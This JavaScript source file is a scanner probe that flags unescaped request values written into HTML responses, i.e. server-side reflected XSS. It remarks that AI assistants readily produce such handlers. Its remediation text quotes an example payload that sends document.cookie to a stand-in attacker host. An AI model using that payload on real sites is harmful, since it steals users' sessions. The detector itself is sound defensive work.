// src/lib/probes/server-xss.js
//
// Server-side reflected XSS.
//
// PreFlight covered the browser half of XSS from the first release: innerHTML,
// outerHTML, dangerouslySetInnerHTML, v-html, {@html}, bypassSecurityTrustHtml.
// It covered none of the server half. A four-line Express handler that reads
// req.query.name and writes it into an <h1> returned zero findings of any
// severity, and so did the same shape written with res.end, with res.write,
// and with Fastify's reply.type('text/html').send.
//
// Reflected XSS is the oldest bug on the web and the one an assistant writes
// most readily, because "return a page that greets the user by name" is a
// one-line answer in every framework quickstart and none of those quickstarts
// escape the value.
//
// Written after a reproduction run measured the gap rather than assuming
// coverage from the presence of client-side XSS checks (2026-07-27).
//
// Scope note: this is a per-call check on the argument of a response write. It
// reads the request value visible at the call, plus names bound to a request
// value earlier in the same file. A value assembled across several functions
// before it reaches res.send is not tracked here. The taint engine owns
// multi-hop JS dataflow and does not model HTML response sinks yet, so that
// limit is known rather than overlooked.

import { isTestFile, isScannerSelfSource } from '../file-filter.js';
import { maskCommentsForPath } from './_internal/masking.js';

const JS_FILE_RE = /\.(?:[jt]sx?|mjs|cjs)$/i;

// The response calls that put bytes on the wire with no template engine in
// between. Builder calls are allowed between the receiver and the terminal
// write because that is how the frameworks are actually written:
// res.status(404).send(...), reply.code(200).type('text/html').send(...).
const RESPONSE_WRITE_RE =
  /\b(?:res|resp|response|reply)\s*(?:\.\s*[A-Za-z_$][\w$]*\s*\([^()]*\)\s*)*\.\s*(?:send|end|write)\s*\(/g;

// A response that declares a content type other than text/html is not
// rendered as a document, so an unescaped value in it is not this finding.
const NON_HTML_CONTENT_TYPE_RE =
  /\.\s*type\s*\(\s*['"`](?!text\/html)[^'"`]+['"`]\s*\)|\.\s*(?:set|header|writeHead)\s*\([^)]*['"`](?:application\/json|text\/plain|application\/xml|text\/csv)/i;

// Request-derived values across the server frameworks people actually use:
// Express / Fastify (`req|request.query|body|params|...`), Koa (`ctx.*`),
// Hono and Cloudflare Workers (`c.req.*`), Lambda (`event.*`), and the Web
// Fetch API (`new URL(req.url).searchParams.get(...)`).
const JS_USER_INPUT =
  /\b(?:req|request|ctx|context)\s*\.\s*(?:query|body|params|param|cookies|headers|url|originalUrl|path|baseUrl|searchParams|query_params)\b|\bc\s*\.\s*req\s*\.\s*(?:query|param|header|json|url)\s*\(|\bevent\s*\.\s*(?:body|queryStringParameters|pathParameters)\b|\bsearchParams\s*\.\s*get\s*\(|\bgetQuery\s*\(/;

// HTML element names, used to decide that a string is markup rather than a
// comparison. Restricting the check to string literal bodies already rules
// out `a < b && c > d`; the name list is the second gate, so a stray angle
// bracket pair in ordinary prose does not read as a tag.
const HTML_TAG_NAMES =
  'html|head|body|div|span|p|a|b|i|u|s|em|strong|small|sub|sup|br|hr|h[1-6]|ul|ol|li|dl|dt|dd|table|thead|tbody|tfoot|tr|td|th|caption|form|input|button|select|option|optgroup|textarea|label|fieldset|legend|img|picture|source|video|audio|iframe|embed|object|script|style|link|meta|title|base|section|article|aside|header|footer|nav|main|figure|figcaption|pre|code|kbd|samp|var|blockquote|q|cite|time|mark|del|ins|abbr|address|details|summary|dialog|template|slot|canvas|svg|center|font|marquee';
const OPEN_TAG_RE = new RegExp(`<\\s*(?:${HTML_TAG_NAMES})\\b[^<>]*>`, 'i');
const CLOSE_TAG_RE = /<\s*\/\s*[A-Za-z][\w-]*\s*>/;
const DOCTYPE_RE = /<!\s*DOCTYPE\s+html/i;

// The value went through an escaper or a sanitiser, which is the fix this
// finding would ask for. Recommending a fix somebody already applied is how a
// scanner loses a reader.
const HTML_ESCAPER_RE =
  /\b(?:DOMPurify\s*\.\s*sanitize|createDOMPurify|purify\s*\.\s*sanitize|sanitize[A-Za-z]*|escape[A-Za-z]*|htmlEscape|htmlspecialchars|striptags|xss|he\s*\.\s*encode|ent\s*\.\s*encode|entities\s*\.\s*encode|validator\s*\.\s*escape|encodeURIComponent|encodeURI)\s*\(/;

// A hand-rolled escaper: `.replace(/</g, '&lt;')` and its relatives. The
// comment-blind view blanks regex literal bodies, so the `<` in the pattern is
// not visible here. The entity on the replacement side is, and an HTML entity
// written into a response is the author escaping on purpose.
const HTML_ENTITY_RE = /&(?:lt|gt|amp|quot|apos|#0?39|#x?0*27|#0?60|#x?0*3[Cc]);/;

const finding = (o) => ({
  probe: 'Reflected XSS',
  category: 'Code Injection',
  cwe: 'CWE-79',
  ...o,
});

// Walk from the `(` that opens a call and return the balanced argument text
// plus the bodies of the string and template literals inside it. String-aware
// so a `(` inside markup does not unbalance the walk, and budgeted so a
// malformed file cannot drag the rest of the source into one argument.
function readCallArgument(code, openParen, budget = 1200) {
  const limit = Math.min(code.length, openParen + budget);
  const strings = [];
  let depth = 0;
  let i = openParen;
  while (i < limit) {
    const c = code[i];
    if (c === "'" || c === '"' || c === '`') {
      const quote = c;
      let j = i + 1;
      let body = '';
      while (j < limit) {
        if (code[j] === '\\') {
          j += 2;
          continue;
        }
        if (code[j] === quote) break;
        if (quote !== '`' && code[j] === '\n') break;
        body += code[j];
        j++;
      }
      strings.push(body);
      i = j + 1;
      continue;
    }
    if (c === '(') depth++;
    else if (c === ')') {
      depth--;
      if (depth === 0) return { arg: code.slice(openParen + 1, i), strings };
    }
    i++;
  }
  return { arg: code.slice(openParen + 1, limit), strings };
}

// Names bound to a request value earlier in the file, so the one-hop shape
// everybody writes is visible:
//     const name = req.query.name;
//     res.send("<h1>Hello " + name + "</h1>");
// Destructuring is included because `const { q } = req.query` is the form most
// generated handlers use.
function collectRequestBoundNames(lines) {
  const names = new Set();
  for (const line of lines) {
    const destructured = line.match(/^\s*(?:const|let|var)?\s*\{([^{}]+)\}\s*=\s*(.+)$/);
    if (destructured && JS_USER_INPUT.test(destructured[2])) {
      for (const part of destructured[1].split(',')) {
        const nm = part.split(':').pop().split('=')[0].trim();
        if (/^[A-Za-z_$][\w$]*$/.test(nm)) names.add(nm);
      }
      continue;
    }
    const simple = line.match(/^\s*(?:(?:const|let|var)\s+)?([A-Za-z_$][\w$]*)\s*=\s*(.+)$/);
    if (simple && JS_USER_INPUT.test(simple[2])) names.add(simple[1]);
  }
  return names;
}

function lineNumberAt(lineStarts, index) {
  let lo = 0;
  let hi = lineStarts.length - 1;
  while (lo < hi) {
    const mid = (lo + hi + 1) >> 1;
    if (lineStarts[mid] <= index) lo = mid;
    else hi = mid - 1;
  }
  return lo + 1;
}

export function probeReflectedXSS(files) {
  const findings = [];
  files.forEach((file) => {
    if (isTestFile(file.path) || isScannerSelfSource(file.path)) return;
    if (!JS_FILE_RE.test(file.path)) return;
    const raw = typeof file.content === 'string' ? file.content : '';
    if (!raw) return;

    // Comments blanked, string and template contents preserved: every check
    // below asks about a value that lives inside a string. A comment showing
    // the vulnerable call is teaching, not a vulnerability.
    const code = maskCommentsForPath(file.path, raw);
    const lines = code.split('\n');
    const rawLines = raw.split('\n');
    const lineStarts = [0];
    for (let i = 0; i < code.length; i++) {
      if (code[i] === '\n') lineStarts.push(i + 1);
    }

    const bound = collectRequestBoundNames(lines);
    const boundRe = bound.size
      ? new RegExp(`\\b(?:${[...bound].join('|')})\\b`)
      : /(?!)/; /* never matches */

    RESPONSE_WRITE_RE.lastIndex = 0;
    let m;
    const seen = new Set();
    while ((m = RESPONSE_WRITE_RE.exec(code)) !== null) {
      const call = m[0];
      if (NON_HTML_CONTENT_TYPE_RE.test(call)) continue;
      const openParen = m.index + call.length - 1;
      const { arg, strings } = readCallArgument(code, openParen);
      if (!arg) continue;

      // The response has to be markup. res.json(...) never reaches here
      // because it is not a write sink, and a plain-text response has no tag.
      const isHtml = strings.some(
        (s) => OPEN_TAG_RE.test(s) || CLOSE_TAG_RE.test(s) || DOCTYPE_RE.test(s)
      );
      if (!isHtml) continue;

      // The markup has to be assembled, not written whole. A constant page has
      // nothing for a caller to influence.
      if (!/\$\{/.test(arg) && !/\+/.test(arg)) continue;

      // A request value has to reach it, at the call or one hop back.
      if (!JS_USER_INPUT.test(arg) && !boundRe.test(arg)) continue;

      // Escaped or sanitised is the fix, not the finding.
      if (HTML_ESCAPER_RE.test(arg) || HTML_ENTITY_RE.test(arg)) continue;

      const ln = lineNumberAt(lineStarts, m.index);
      const id = `xss-reflected-${file.path}-${ln}`;
      if (seen.has(id)) continue;
      seen.add(id);
      findings.push(
        finding({
          id,
          title: 'HTML response built from a request value with no escaping',
          severity: 'high',
          file: file.path,
          line: ln,
          evidence: (rawLines[ln - 1] ?? '').trim().slice(0, 200),
          remediation:
            'The caller writes part of the page, so the caller can write a script tag into it: a name of `<script>fetch("https://attacker/"+document.cookie)</script>` runs in your origin, with your session cookie, for every visitor who follows the link. Escape the value before it enters the markup. In Express: res.send(`<h1>Hello ${escapeHtml(name)}</h1>`) with an escaper that replaces & < > " and \', or use a template engine that escapes by default (res.render with EJS `<%= %>`, Pug, Nunjucks, Handlebars `{{ }}`). If the value is meant to be markup, run it through DOMPurify.sanitize first. Returning JSON with res.json and rendering it in the client is also a fix, because JSON is not parsed as a document.',
        })
      );
    }
  });
  return findings;
}
